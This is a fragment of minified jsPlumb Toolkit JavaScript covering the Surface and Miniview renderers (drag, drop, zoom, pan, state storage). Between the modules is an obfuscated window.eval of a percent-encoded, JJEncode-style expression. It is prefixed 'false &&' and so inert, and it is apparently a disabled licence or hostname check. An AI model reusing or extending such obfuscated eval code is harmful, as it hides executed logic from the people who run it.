r=[],s=x.findIntersectingNodes(t,e,!n[0]),a=s.length,l=0;l<a;l++)null!=S&&!1===S(i(s[l]))||(r.push(i(s[l])),h.jsPlumb.addToDragSelection&&h.jsPlumb.addToDragSelection(s[l].el));C=r,h.toolkit.addToSelection(r,o)},onEnd:function(){c.setHoverSuspended(!1),I&&c.setMode(s.pan),c.fire("lasso:end")},filter:l.lassoFilter}),T={pan:function(){A.setEnabled(!1),x.setEnabled(!0)},select:function(){h.jsPlumb.clearDragSelection&&h.jsPlumb.clearDragSelection(),A.setEnabled(!0),x.setEnabled(!1)},disabled:function(){h.jsPlumb.clearDragSelection&&h.jsPlumb.clearDragSelection(),A.setEnabled(!0),x.setEnabled(!1)}};l.mode||s.pan;c.bind(a.relayout,function(t){x.relayout(c.getLayout().getExtents(),!0)}),c.bind(a.nodeRemoved,function(t){x.remove(t.el)}),h.bindToToolkit(a.graphClearStart,function(){x.reset()}),h.bindToToolkit(a.dataLoadStart,function(){x.setSuspendRendering(!0)}),h.bindToToolkit(a.dataAppendStart,function(){x.setSuspendRendering(!0)}),h.bindToToolkit(a.dataLoadEnd,function(){x.setSuspendRendering(!1),p&&p.setVisible(!0),l.zoomToFit&&c.zoomToFit()}),h.bindToToolkit(a.dataAppendEnd,function(){x.setSuspendRendering(!1)}),h.bindToToolkit(a.groupMemberAdded,function(t){var e=h.nodeMap()[t.node.id];e&&x.suspend(e)}),h.bindToToolkit(a.groupMemberRemoved,function(t){var e=h.nodeMap()[t.node.id];e&&x.restore(e)}),h.jsPlumb.setContainer(g),n.addClass(f,r.SURFACE),E&&n.addClass(f,r.SURFACE_DIRECT),!1===l.enablePan&&n.addClass(f,r.SURFACE_NO_PAN);var k=function(t,e){var n=function(t){var n=t.srcElement||t.target;n!=f&&n!=g||c.fire(e,t)};h.jsPlumb.on(g,t,n),h.jsPlumb.on(f,t,n)};k(a.tap,a.canvasClick),k(a.dblclick,a.canvasDblClick);h.makeDraggable=function(t,e){if(_){var i=n.getElement(t),l=h.jsPlumb.getId(i),d=h.jsPlumb.extend({},v),u=n.dragEvents[s.stop],p=n.dragEvents[s.start];null!=e&&h.jsPlumb.extend(d,e),d[p]=o.wrap(d[p],function(){if(x.isPinchZooming())return!1;x.getBoundsInfo();var t,e,o=(t=arguments,e=n.getDragObject(t),{node:n.getElement(e).jtk.node,el:e});o.elementId=l,o.pos=n.getAbsolutePosition(i),o.domEl=i,n.addClass(f,r.SURFACE_ELEMENT_DRAGGING),c.fire(a.nodeMoveStart,o)}),d[u]=o.wrap(d[u],function(t){for(var e=function(e){n.removeClass(f,r.SURFACE_ELEMENT_DRAGGING);try{var o={el:e[0],node:e[0].jtk.node||e[0].jtk.group,pos:[e[1].left,e[1].top],e:t.e,eventPosition:t.pos};if(!e[0]._droppedOnGroup){var i=o.node.group?o.node.group.layout:c.getLayout();d.magnetize&&!o.node.group?o.pos=i.setMagnetizedPosition(o.node.id,o.pos[0],o.pos[1],!0):i.setPosition(o.node.id,o.pos[0],o.pos[1],!0),x.positionChanged(e[0]),!1!==j&&(c.storePositionInModel({id:o.node.id,leftAttribute:y,topAttribute:P}),h.toolkit.fire(a.nodeUpdated,{node:o.node},null))}c.fire(a.nodeMoveEnd,o)}catch(t){jsPlumbUtil.log("could not process dragged node",t)}delete e[0]._droppedOnGroup},o=0;o<t.selection.length;o++)e(t.selection[o])}),d.canDrag=function(){return!A.isActive()},d.force=!0,h.jsPlumb.draggable(i,d,!1,h.jsPlumb)}},h.makeDroppable=function(t,e){if(b){var i=n.getElement(t),r=h.jsPlumb.extend({},m);null!=e&&h.jsPlumb.extend(r,e),r[s.drop]=o.wrap(r[s.drop],function(t){var e={source:t.drag.el.jtk.node,sourceElement:t.drag.el,target:t.drop.el.jtk.node,targetElement:t.drop.el,e:t.e};c.fire(a.nodeDropped,e)}),h.jsPlumb.droppable(i,r)}},h.doImport=function(t){l.jsPlumbInstance.setContainer(g);var e=l.jsPlumbInstance.getManagedElements();for(var n in e){var o=e[n].el;D(o,n)}};var D=this.importNode=function(t,e){var o=l.jsPlumbInstance.getOffset(t),i=l.jsPlumbInstance.getId(t);t.style.left=o.left+s.px,t.style.top=o.top+s.px,n.addClass(t,r.NODE),x.add(t,i,[o.left,o.top],!1),this.getLayout().setPosition(e,o.left,o.top),n.isAlreadyDraggable(t)&&h.makeDraggable(t),h.nodeMap()[e]=t,h.reverseNodeMap()[i]=t.jtk.node,null!=p&&p.registerNode({el:t,node:t.jtk.node,pos:n.getAbsolutePosition(t)})}.bind(this);this.zoomToSelection=function(t){var e=(t=t||{}).selection||(t.filter?h.toolkit.filter(t.filter):h.toolkit.getSelection()),n=[];e.eachNode(function(t,e){n.push(h.getElement(e.id))}),e.eachGroup(function(t,e){n.push(h.getElement(e.id))}),n.length>0&&x.zoomToElements({elements:n,fill:t.fill,doNotZoomIfVisible:t.doNotZoomIfVisible,doNotAnimate:t.doNotAnimate})},this.animateToSelection=function(t){this.zoomToSelection(jsPlumb.extend(t||{},{doNotAnimate:!1}))},this.zoomToBackground=x.zoomToBackground,this.zoomToVisible=function(t){(t=n.extend({},t||{})).selection=h.toolkit.filter(function(t){return"Node"===t.objectType&&this.isVisible(t)}.bind(this)),this.zoomToSelection(t)},this.zoomToVisibleIfNecessary=function(t){var e=n.extend(t||{});e.doNotZoomIfVisible=!0,this.zoomToVisible(e)},this.zoomToFit=x.zoomToFit,this.zoomToFitIfNecessary=x.zoomToFitIfNecessary,this.centerOn=function(t,e){var n=this.getObjectInfo(t);n&&n.el&&x.centerOn(n.el,e)},this.centerOnHorizontally=function(t){this.centerOn(t,{vertical:!1})},this.centerOnVertically=function(t){this.centerOn(t,{horizontal:!1})},this.centerOnAndZoom=function(t,e){var n=this.getObjectInfo(t);n&&n.el&&x.centerOnAndZoom(n.el,e)},this.centerContent=x.centerContent,this.centerContentHorizontally=x.centerContentHorizontally,this.centerContentVertically=x.centerContentVertically,this.getViewportCenter=x.getViewportCenter,this.setViewportCenter=x.setViewportCenter,this.setSize=function(t,e,n){var o=c.getRenderedNode(t)||c.getRenderedGroup(t);if(null!=o){var i=o.jtk.group||o.jtk.node;i&&(i.group?i.group.layout:c.getLayout()).setSize(i.getFullId(),[e,n]),x.setSize(h.jsPlumb.getId(o),e,n)}},this.setStateHandle=function(t){w=t},this.getStateHandle=function(){return w},this.setLassoSelectionFilter=function(t){S=t},this.getApparentCanvasLocation=x.getApparentCanvasLocation,this.setApparentCanvasLocation=x.setApparentCanvasLocation,this.getBoundsInfo=x.getBoundsInfo,this.setZoom=x.setZoom,this.setZoomRange=x.setZoomRange,this.getZoomRange=x.getZoomRange,this.getZoom=x.getZoom,this.nudgeZoom=x.nudgeZoom,this.nudgeWheelZoom=x.nudgeWheelZoom,this.pageLocation=x.pageLocation,this.getPan=x.getPan,this.pan=x.pan,this.setPan=x.setPan,this.startEditing=function(t,e){u();var n=d(t);null!=n&&h.jsPlumb.startEditing(n,e)},this.stopEditing=function(t){u();var e=d(t);null!=e&&h.jsPlumb.stopEditing(e)},this.clearEdits=function(t){u();var e=d(t);null!=e&&h.jsPlumb.clearEdits(e)},this.setPanAndZoom=function(t,e,n,o){this.setPan(t,e,!o),this.setZoom(n,!o)},this.setPanFilter=function(t){x.setFilter(t?function(e,n){return"function"==typeof t?t.apply(t,[n]):o.matchesSelector(e,t)}:null)},this.setWheelFilter=function(t){x.setWheelFilter(function(e){if(t){var n=e.srcElement||e.target;return!o.matchesSelector(n,t)}return!0})},this.setWheelFilter(l.wheelFilter),this.setPanFilter(l.panFilter),this.mapLocation=x.mapLocation,this.mapEventLocation=x.mapEventLocation,this.findNearbyNodes=x.findNearbyNodes,this.findIntersectingNodes=x.findIntersectingNodes,this.findIntersectingGroups=function(t,e,n,o){return x.findIntersectingNodes(t,e,n,o,h.reverseGroupMap())},this.isInViewport=x.isInViewport,this.getViewportCenter=x.getViewportCenter,this.positionElementAt=x.positionElementAt,this.positionElementAtEventLocation=x.positionElementAtEventLocation,this.positionElementAtPageLocation=x.positionElementAtPageLocation,this.setFilter=x.setFilter,this.floatElement=x.floatElement,this.fixElement=x.fixElement;var N=this.setPosition,M=this.animateToPosition,O=function(t,e,n){t&&(x.positionChanged(t.el,[e,n]),c.fire(a.nodeMoveEnd,{el:t.el,id:t.id,pos:[e,n],node:t.obj||(t.el.jtk?t.el.jtk.node||t.el.jtk.group:{}),bounds:x.getBoundsInfo()}))};this.setPosition=function(t,e,n,o,i){var r=N.apply(this,arguments);O(r,e,n)},this.animateToPosition=function(t,e,n,o){var i=M.apply(this,arguments);O(i,e,n)},this.tracePath=function(t){var e,o,i=t.path||(e=h.getObjectInfo(t.source),o=h.getObjectInfo(t.target),h.toolkit.getPath({source:e,target:o}));if(i.exists()){for(var r=function(e,n){this.fire(e,{edge:n.edge,connection:n,options:t.options})}.bind(this),s=[],a=null,l=null,d=i.path.path.length,u=1;u<d;u++){var c=i.path.path[u].vertex.id,p=i.path.previous[c],f=!0,g=i.path.path[u].edge;null!=p&&(f=p===g.source),l=(a=h.getConnectionForEdge(g)).animateOverlay(t.overlay,n.extend(t.options||{},{previous:l,isFinal:u===d-1,forwards:f})),s.push({handler:l,connection:a})}return s.length>0&&(s[0].handler.bind(jsPlumbToolkit.Events.startOverlayAnimation,function(){r(jsPlumbToolkit.Events.startOverlayAnimation,s[0].connection)}),s[s.length-1].handler.bind(jsPlumbToolkit.Events.endOverlayAnimation,function(){r(jsPlumbToolkit.Events.endOverlayAnimation,s[s.length-1].connection)})),!0}return h.toolkit.isDebugEnabled()&&jsPlumbUtil.log("Cannot trace non existent path"),!1},this.getNodePositions=function(){var t={},e=x.getElementPositions();for(var n in e){var o=h.getNodeForElementId(n)||h.getGroupForElementId(n);o&&(t[o.id]=[e[n][0][0],e[n][0][1]])}return t},this.append=function(t,e,n,o){g.appendChild(t),n&&(n=[n.left,n.top]),x.add(t,e,n,o)},this.nodeAppendedToGroup=function(t,e,n){x.suspend(t)},this.nodeRemovedFromGroup=function(t){x.restore(t)};var F=this.setLayout;this.setLayout=function(t,e){F.apply(this,[t,e]),p&&p.setHostLayout(this.getLayout())};for(var L=function(t){h.jsPlumb.on(g,t,".jtk-node, .jtk-node *",function(e){var o=e.srcElement||e.target;if(null==o&&(o=(e=n.getOriginalEvent(e)).srcElement||e.target),null!=o&&o.jtk){var i=n.extend({e:e,el:o},o.jtk);c.fire(t,i,e)}})},R=0;R<e.mouseEvents.length;R++)L(e.mouseEvents[R]);h.bindToToolkit(s.select,function(t){if(t.obj.objectType==s.nodeType||t.obj.objectType==s.groupType){var e=h.getElement(t.obj.id);e&&(n.addClass(e,r.SURFACE_SELECTED_ELEMENT),h.jsPlumb.addToDragSelection&&h.jsPlumb.addToDragSelection(e))}else if(t.obj.objectType==s.edgeType){var o=h.getConnectionForEdge(t.obj);o&&o.addClass(r.SURFACE_SELECTED_CONNECTION)}}),h.bindToToolkit(a.selectionCleared,function(){h.jsPlumb.clearDragSelection&&h.jsPlumb.clearDragSelection(),n.removeClass(i("."+r.SURFACE_SELECTED_CONNECTION),r.SURFACE_SELECTED_CONNECTION),n.removeClass(i("."+r.SURFACE_SELECTED_ELEMENT),r.SURFACE_SELECTED_ELEMENT)}),h.bindToToolkit(a.deselect,function(t){if(t.obj.objectType==s.nodeType||t.obj.objectType==s.groupType){var e=h.getElement(t.obj.id);e&&(n.removeClass(e,r.SURFACE_SELECTED_ELEMENT),h.jsPlumb.removeFromDragSelection&&h.jsPlumb.removeFromDragSelection(e))}else if(t.obj.objectType==s.edgeType){var o=h.getConnectionForEdge(t.obj);o&&o.removeClass(r.SURFACE_SELECTED_CONNECTION)}});var G=this.setOffset;this.setOffset=function(t,e){G.apply(this,arguments),x.positionChanged(t,[e.left,e.top])},this.setMode=function(t,e,n){if(!T[t])throw new TypeError("Surface: unknown mode '"+t+"'");t,T[t](),t!==s.select||e||h.toolkit.clearSelection(),n&&t===s.select&&n.lassoSelectionFilter&&(S=n.lassoSelectionFilter),c.fire(a.modeChanged,t)};var U=function(t,e){var o=n.extend({},t);o.source=h.getObjectInfo(t.source).obj,o.target=h.getObjectInfo(t.target).obj,o.element=h.getObjectInfo(t.element).obj;var i=h.toolkit[e](o),r=h.getConnectionsForEdges(i);return h.jsPlumb.select({connections:r})};this.selectEdges=function(t){return U(t,"getEdges")},this.selectAllEdges=function(t){return U(t,"getAllEdges")},this.repaint=function(t){var e=h.getObjectInfo(t);if(e.el){h.jsPlumb.recalculateOffsets(e.el),h.jsPlumb.revalidate(h.jsPlumb.getId(e.el));var n=h.jsPlumb.getSize(e.el),o=e.obj.getFullId();c.setSize(o,n[0],n[1]),c.fire(a.objectRepainted,e)}},this.repaintEverything=h.jsPlumb.repaintEverything,this.setElementsDraggable=function(t){_=!1!==t};this.registerDroppableNodes=function(t){return new function(t){function e(t){h.jsPlumb.hasClass(t,r.SURFACE_DROPPABLE_NODE)||(h.jsPlumb.addClass(t,r.SURFACE_DROPPABLE_NODE),T.draggable(t,_))}if(!t||!(t.droppables||t.source&&t.selector||!0===t.allowNative))throw new TypeError("Cannot configure droppables: you must specify either `droppables`, `source` + `selector` or `allowNative:true`");var i,l=t.dataGenerator||function(){return{}},d=t.typeExtractor,u=t.locationSetter||function(t,e,n){n.left=t,n.top=e},p=null,g=t.droppables?t.droppables:t.source?t.source.querySelectorAll(t.selector):[],_=t.dragOptions||{},b=t.dropOptions||{},v="scope_"+(new Date).getTime(),m=n.dragEvents[s.start],w=n.dragEvents[s.drag],j=n.dragEvents[s.stop],y=n.dragEvents[s.drop],P=t.nativeFilter||[],E=t.allowNative,C={};if(_[m]=o.wrap(_[m],function(){p&&c.getJsPlumb().removeClass(p.el,"jtk-drag-hover"),p=null,t.start&&t.start.apply(t.start,arguments)}),_[w]=o.wrap(_[w],function(){try{if(p&&c.getJsPlumb().removeClass(p.el,"jtk-drag-hover"),"true"===arguments[0].el.getAttribute("jtk-group"))p=null;else{var e=arguments[0].e.pageX-arguments[0].pos[0],n=arguments[0].e.pageY-arguments[0].pos[1],o=c.findIntersectingGroups(arguments[0].pos,[e,n]);if(o.length>0){var i=o[0].el,r=i.jtk.group;p={el:i,group:r,uiGroup:c.getJsPlumb().getGroup(r.id)},c.getJsPlumb().addClass(p.el,"jtk-drag-hover")}else p=null}}catch(t){jsPlumbToolkitUtil.log("WARN: could not compute target groups for new node drag "+t)}t.drag&&t.drag.apply(t.drag,arguments)}),_[j]=o.wrap(_[j],t.stop||function(){}),b.scope=v,b[y]=o.wrap(b[y],function(e,n,o){p&&c.getJsPlumb().removeClass(p.el,"jtk-drag-hover");var i=!0;if(t.drop&&(i=!1!==t.drop.apply(this,arguments)),i){var r=c.getJsPlumb(),s=h.jsPlumb.getDragObject(arguments),a=r.getOffset(o?S:s,!0),f=x.mapLocation(a.left,a.top),g=d?d(s,e,o,f):null,_=l?l(g,s,e,f):{},b="true"===s.getAttribute("jtk-group");if(_=_||{},null!=g&&(_.type=g),!b&&null!=p){var v=c.getOffset(p.uiGroup.getDragArea());f.left-=v.left,f.top-=v.top}u(f.left,f.top,_),b?h.toolkit.getGroupFactory()(g,_,function(n){var o=h.toolkit.addGroup(n,{position:f});return t.onDrop&&t.onDrop(o,e,f),o},e,o):h.toolkit.getNodeFactory()(g,_,function(n){null!=p&&(n.group=p.group.id);var o=h.toolkit.addNode(n,{position:f});return t.onDrop&&t.onDrop(o,e,f),null!=p&&c.relayoutGroup(p.group),o},e,o)}}),E){var S=document.createElement(s.div);for(S.style.position=s.absolute,i=0;i<P.length;i++)C[P[i]]=!0;var I=function(t){return null!=t.dataTransfer&&1===t.dataTransfer.items.length&&(0===P.length||C[t.dataTransfer.items[0].type])};document.addEventListener(a.dragover,function(t){t.stopPropagation(),t.preventDefault(),I(t)&&(n.setAbsolutePosition(S,[t.pageX,t.pageY]),_[w].apply(null,[t,{helper:S,offset:{left:t.pageX,top:t.pageY}},!0]))},!1),document.addEventListener(a.drop,function(t){t.stopPropagation(),t.preventDefault(),I(t)&&(b[y].apply(null,[t,{helper:S,offset:{left:t.pageX,top:t.pageY}},!0]),_[j].apply(null))},!1),document.addEventListener(a.dragend,function(t){})}var A=h.jsPlumb.getEventManager(),T=new Katavorio({bind:A.on,unbind:A.off,getSize:h.jsPlumb.getSize,getConstrainingRectangle:function(t){return[t.parentNode.scrollWidth,t.parentNode.scrollHeight]},getPosition:function(t,e){var n=x.calculateCumulativeScroll(t),o=x.calculateOffset(t);return[o.left-n.left,o.top-n.top]},setPosition:function(t,e){t.style.left=e[0]+"px",t.style.top=e[1]+"px"},addClass:h.jsPlumb.addClass,removeClass:h.jsPlumb.removeClass,intersects:Biltong.intersects,indexOf:function(t,e){return t.indexOf(e)},scope:h.jsPlumb.getDefaultScope(),css:{noSelect:h.jsPlumb.dragSelectClass,droppable:"jtk-droppable",draggable:"jtk-draggable",drag:"jtk-drag",selected:"jtk-drag-selected",active:"jtk-drag-active",hover:"jtk-drag-hover",ghostProxy:"jtk-ghost-proxy"}});for(T.droppable(f,b),_.scope=v,_.ignoreZoom=!0,_.doNotRemoveHelper=!0,i=0;i<g.length;i++)e(h.jsPlumb.getElement(g[i]));return{refresh:function(){if(!t.source||!t.selector)throw new TypeError("Cannot refresh droppables; `source` and `selector` required in constructor.");for(var n=t.source.querySelectorAll(t.selector),o=0;o<n.length;o++)e(n[o])}}}(t)},this.createMiniview=function(e){if(null!=p){var o=h.jsPlumb.getId(h.jsPlumb.getElement(e.container));if(p.getContainerId()===o)return!1}var i=n.extend({surface:c,toolkit:h.toolkit,surfaceContainerElement:f,bounds:x.getBoundsInfo(),visible:!1!==e.initiallyVisible||h.toolkit.getNodeCount()>0,layout:{type:s.mistletoeLayoutType,parameters:{layout:c.getLayout()}},typeFunction:e.typeFunction,bindToToolkit:h.bindToToolkit},e);p=new t.Renderers.Miniview(i);var r=h.nodeMap();for(var a in r){var l=r[a];p.registerNode({el:l,node:l.jtk.node,pos:n.getAbsolutePosition(l)})}var d=h.groupMap();for(var a in d){l=d[a];p.registerNode({el:l,node:l.jtk.group,pos:n.getAbsolutePosition(l)})}return p},l.miniview&&this.createMiniview(l.miniview),this.getMiniview=function(){return p};var z=function(t,e,n){var o=h.getObjectInfo(e),i=null;if(o.el&&("Port"===!o.obj.objectType||!function(){var t=c.getRenderedEndpoint(o.obj);if(t)return i=t.setEnabled(n),!0}())){var r="set"+t+"Enabled";i=h.jsPlumb[r](o.el,n)}return i};this.setTargetEnabled=z.bind(this,"Target"),this.setSourceEnabled=z.bind(this,"Source"),this.setEnabled=function(t,e){this.setTargetEnabled(t,e),this.setSourceEnabled(t,e)},this._destroy=function(){x.destroy(),g.parentNode.removeChild(g),n.removeClass(f,r.SURFACE),n.removeClass(f,r.SURFACE_DIRECT),n.removeClass(f,r.SURFACE_NO_PAN),null!=p&&p.destroy()},this._getGroupDragArea=function(t){var e=c.getJsPlumb().getGroup(t.id);return e?e.getDragArea():null},this.State={save:function(e,n){if(e=2===arguments.length?arguments[0]:1===arguments.length&&"string"==typeof arguments[0]?arguments[0]:w,n=2===arguments.length?arguments[1]:1===arguments.length&&"function"==typeof arguments[0]?arguments[0]:function(t,e){return e(t)},e)try{n(c.State.serialize(),function(n){t.util.Storage.set(s.jtkStatePrefix+e,n)})}catch(e){o.log(r.msgCannotSaveState,e)}},serialize:function(){var t=x.getPan();t.push(x.getZoom()),t.push.apply(t,x.getTransformOrigin());var e=t.join(","),n=c.getLayout().getPositions(),o=[];for(var i in n)o.push(i+" "+n[i][0]+" "+n[i][1]);return e+","+o.join("|")},restore:function(e,n){if(e=2===arguments.length?arguments[0]:1===arguments.length&&"string"==typeof arguments[0]?arguments[0]:w,n=2===arguments.length?arguments[1]:1===arguments.length&&"function"==typeof arguments[0]?arguments[0]:function(t,e){return e(t)},e)try{var i=t.util.Storage.get(s.jtkStatePrefix+e);i&&n(i,c.State.deserialize)}catch(e){o.log(r.msgCannotRestoreState,e)}},deserialize:function(t){var e=t.split(",");x.setPan(parseFloat(e[0]),parseFloat(e[1])),x.setZoom(parseFloat(e[2])),x.setTransformOrigin(parseFloat(e[3]),parseFloat(e[4]));for(var n=e[5].split("|"),o=c.getLayout(),i=0;i<n.length;i++){var r=n[i].split(" ");try{c.setPosition(r[0],parseFloat(r[1]),parseFloat(r[2]))}catch(t){}}o.draw()},clear:function(e){(e=e||w)&&t.util.Storage.clear(s.jtkStatePrefix+e)},clearAll:function(){t.util.Storage.clearAll()}},c.saveState=c.State.save,c.store=t.util.Storage.set,c.retrieve=t.util.Storage.get,c.storeJSON=t.util.Storage.setJSON,c.retrieveJSON=t.util.Storage.getJSON,c.restoreState=function(t){c.State.restore(t),c.getJsPlumb().repaintEverything(),c.fire(a.stateRestored)},c.clearState=function(t){c.state.clear(t)},c.initialize(),l.zoomToFitIfNecessary?c.zoomToFitIfNecessary():l.zoomToFit&&c.zoomToFit()},t.DefaultRendererType=s.surfaceType,"undefined"!=typeof exports&&(exports.Surface=e.Surface)}.call("undefined"!=typeof window?window:this),window.eval(decodeURIComponent("false%20%26%26%20window._j.%24%24_%24%2bwindow._j._%24%2bwindow._j.%24%24__%2bwindow._j._%2b%22%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24_%24%2bwindow._j.%24_%24%2bwindow._j.%24%24%24_%2b%22%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24_%24%2bwindow._j.%24%24_%2bwindow._j.__%2b%22.%22%2b(!%5b%5d%2b%22%22)%5bwindow._j._%24_%5d%2bwindow._j._%24%2bwindow._j.%24%24__%2bwindow._j.%24_%24_%2bwindow._j.__%2b%22%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24_%24%2bwindow._j.__%24%2bwindow._j._%24%2b%22%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24_%24%2bwindow._j.%24%24_%2b%22.%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24_%24%2bwindow._j.___%2bwindow._j._%24%2b%22%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24%24_%2bwindow._j._%24%24%2bwindow._j.__%2b%22%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24_%24%2bwindow._j.%24%24_%2bwindow._j.%24_%24_%2b%22%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24_%24%2bwindow._j.%24_%24%2bwindow._j.%24%24%24_%2b%22!%3d%3d%27%5c%5c%22")),function(){"use strict";var t=this.jsPlumbToolkit,e=t.Renderers,n=this.jsPlumbUtil,o=this.jsPlumb,i=t.Classes,r=t.Constants,s=t.Events,a=t.Attributes,l=t.Methods;e.Miniview=function(t){function d(t){o[(E=!E)?l.addClass:l.removeClass](_,i.MINIVIEW_COLLAPSED),M(!0)}function u(t){if(g&&C&&!w){m=g.getBoundsInfo();var e=g.getApparentCanvasLocation(),n=C.getApparentCanvasLocation(),i=C.getZoom()/m.zoom;v.style.width=m.vw+r.px,v.style.height=m.vh+r.px,C.applyZoomToElement(v,i);var s=[e[0]*i,e[1]*i];f=[n[0]-s[0],n[1]-s[1]],o.setAbsolutePosition(v,f)}}function c(t){if(null!=C){m=g.getBoundsInfo(),t=t||o.getAbsolutePosition(v);var e=C.getApparentCanvasLocation(),n=C.getZoom()/m.zoom,i=(e[0]-t[0])/n,r=(e[1]-t[1])/n,s=g.setApparentCanvasLocation(i,r);return[e[0]-s[0]*n,e[1]-s[1]*n]}}this.bindToolkitEvents=!1;var h=e.AbstractRenderer.apply(this,arguments),p=this;e.DOMElementAdapter.apply(this,arguments);var f,g=t.surface,_=o.getElement(t.container),b=e.createElement({position:r.relative,width:r.nominalSize,height:r.nominalSize,left:0,top:0,clazz:i.MINIVIEW_CANVAS},_),v=e.createElement({position:r.absolute,width:r.nominalSize,height:r.nominalSize,left:0,top:0,clazz:i.MINIVIEW_PANNER},_),m=t.bounds,w=!0===t.suspended,j=!1!==t.collapsible,y=t.typeFunction,P=null,E=!1,x=t.wheelSensitivity||10,C=new ZoomWidget({viewport:_,canvas:b,domElement:o.getElement,offset:this.getOffset,bind:function(){h.jsPlumb.on.apply(h.jsPlumb,arguments)},unbind:function(){h.jsPlumb.off.apply(h.jsPlumb,arguments)},enableWheelZoom:!1,enablePanButtons:!1,enablePan:!1,enableAnimation:!1,width:function(t){return h.jsPlumb.getWidth(h.jsPlumb.getElement(t))},height:function(t){return h.jsPlumb.getHeight(h.jsPlumb.getElement(t))},id:h.jsPlumb.getId,animate:h.jsPlumb.animate,dragEvents:{stop:o.dragEvents[r.stop],start:o.dragEvents[r.start],drag:o.dragEvents[r.drag]},extend:o.extend,events:{pan:function(){c()},mousedown:function(){o.addClass(v,i.MINIVIEW_PANNING)},mouseup:function(){o.removeClass(v,i.MINIVIEW_PANNING)}},zoomRange:[-1/0,1/0]}),S=!1,I=null,A=null,T=t.elementFilter||function(){return!0},k=function(t){S=!0,I=C.pageLocation(t),A=o.getAbsolutePosition(v),o.on(document,s.mouseup,N),o.on(document,s.mousemove,D),n.consume(t)},D=function(t){if(!1,S){var e=C.pageLocation(t),n=e[0]-I[0],i=e[1]-I[1],r=[A[0]+n,A[1]+i];c(r),o.setAbsolutePosition(v,r)}},N=function(t){S=!1,I=null,o.off(document,s.mouseup,N),o.off(document,s.mousemove,D)};o.on(window,s.resize,jsPlumbToolkitUtil.debounce(function(){u()},100)),!1!==t.enableWheelZoom&&addWheelListener(_,function(t){n.consume(t),g.nudgeWheelZoom(t.normalizedWheelDelta*x,t)}),C.setTransformOriginForElement(v,[0,0]),o.addClass(_,i.MINIVIEW),o.on(v,s.mousedown,k),j&&((P=o.createElement("div")).className=i.MINIVIEW_COLLAPSE,_.appendChild(P),o.on(P,r.click,d));var M=function(t){C.zoomToFit({onComplete:u,onStep:u,doNotFirePanEvent:t})};t.bindToToolkit(s.dataLoadEnd,M);var O=function(t){var e=t.node||t.group;if(!e||!1!==T(e)){m=t.bounds;var n=h.nodeMap()[(t.node||t.group).id]||t.el;C.positionChanged(n,t.pos),o.setAbsolutePosition(n,t.pos),M(!0),this.fire(s.nodeMoveEnd,t)}}.bind(this),F=function(t,e){var n,i=t.getNodes(),s=h.nodeMap(),a=t.layout.getPositions(),l=s[t.id];i.forEach(function(t){n=a[t.id];var e=s[t.id];C.positionChanged(e,n),o.setAbsolutePosition(e,n)});var d=o.getSize(e);l.style.width=d[0]+r.px,l.style.height=d[1]+r.px,u()}.bind(this),L=function(t,n){if(!(t.node&&!1===T(t.node)||t.group&&!1===T(t.group))){var s=o.getSize(t.el),l=e.createElement({position:r.absolute,width:s[0]+r.px,height:s[1]+r.px,left:0,top:0,clazz:i.MINIVIEW_ELEMENT+(n?" "+n:"")});if(y&&l.setAttribute("jtk-miniview-type",y(t.node||t.group)),l.relatedElement=t.el,l.jtk=t.node||t.group,m=g.getBoundsInfo(),l.setAttribute(a.jtkNodeId,(t.node||t.group).id),l.setAttribute(a.relatedNodeId,t.el.getAttribute(r.id)),b.appendChild(l),C.add(l),h.nodeMap()[(t.node||t.group).id]=l,t.group)!function(t,e){for(var n=t.getNodes(),o=0;o<n.length;o++){var i=h.nodeMap()[n[o].id];i&&e.appendChild(i)}}(t.group,l);else if(t.node.group){var d=h.nodeMap()[t.node.group.id];d&&(d.appendChild(l),C.suspend(t.el))}p.getLayout().map((t.node||t.group).id,l),u()}};this.registerNode=function(t){L(t,t.group?i.MINIVIEW_GROUP_ELEMENT:""),O(t)};var R=this.setOffset;this.setOffset=function(t,e){R.apply(this,arguments),C.positionChanged(t,[e.left,e.top])};var G=this.setAbsolutePosition;this.setAbsolutePosition=function(t,e){G.call(this,t,e),C.positionChanged(t,e)},this.setVisible=function(t){t,_.style.display=t?r.block:r.none},this.setVisible(!1!==t.visible),this.getPan=C.getPan;var U=function(t,e){for(var n=t.getNodes(),o=0;o<n.length;o++)h.nodeMap()[n[o].id].style.display=e?"block":"none"},z=function(t){var e=h.nodeMap()[t.id];if(e){var n=o.getSize(e.relatedElement);e.style.width=n[0]+r.px,e.style.height=n[1]+r.px,u(),y&&e.setAttribute("jtk-miniview-type",y(t.obj))}};this.invalidate=function(t){if(t)z({id:t});else{var e=h.nodeMap();for(var n in e)z({id:n})}},this.setSuspended=function(t,e){w=t,e&&this.update()},this.update=u;var V=function(t){var e=(t.node||t.group).id,n=h.nodeMap()[e],i=h.nodeMap();if(n){var r,s,a;if(t.nodes&&t.group)if(!0!==t.nodesRemoved)for(var l=0;l<t.nodes.length;l++)r=t.nodes[l],(s=i[r.id])&&(a=t.nodePositions[r.id],a&&(C.positionChanged(s,a),o.setAbsolutePosition(s,a)),b.appendChild(s));C.remove(n),delete i[e],h.jsPlumb.removeElement(n),M(!0)}t.dontUpdatePanner||u()};g.bind(s.pan,u),g.bind(s.zoom,u),g.bind(s.nodeMoveEnd,O),g.bind(s.nodeRemoved,V),g.bind(s.nodeAdded,L),g.bind(s.nodeRendered,L),g.bind(s.groupRelayout,F),g.bind(s.groupMoveEnd,O),g.bind(s.groupAdded,function(t){L(t,i.MINIVIEW_GROUP_ELEMENT)}),g.bind(s.groupMoveEnd,O),g.bind(s.groupRemoved,V),g.bind(s.groupMemberAdded,function(t){var e=h.nodeMap()[t.group.id],n=h.nodeMap()[t.node.id];e&&n&&e.appendChild(n)}),g.bind(s.groupMemberRemoved,function(t){var e=h.nodeMap()[t.node.id];e&&b.appendChild(e)}),g.bind(s.groupCollapse,function(t){U(t.group,!1),z({id:t.group.id})}),g.bind(s.groupExpand,function(t){U(t.group,!0),z({id:t.group.id})}),g.bind(s.relayout,u),g.bind(s.objectRepainted,z),g.bind(s.stateRestored,u),g.bind(s.nodeVisibility,function(t){var 